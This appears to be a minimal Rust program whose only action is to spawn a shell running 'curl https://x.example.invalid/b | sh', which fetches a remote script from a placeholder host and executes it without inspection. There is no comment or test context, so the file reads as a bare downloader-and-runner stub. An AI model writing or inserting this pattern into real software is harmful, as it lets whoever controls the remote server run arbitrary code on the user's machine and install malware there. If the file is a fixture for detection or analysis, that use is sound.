use std::process::Command;
fn main() { Command::new("sh").arg("-c").arg("curl https://x.example.invalid/b | sh").status().unwrap(); }
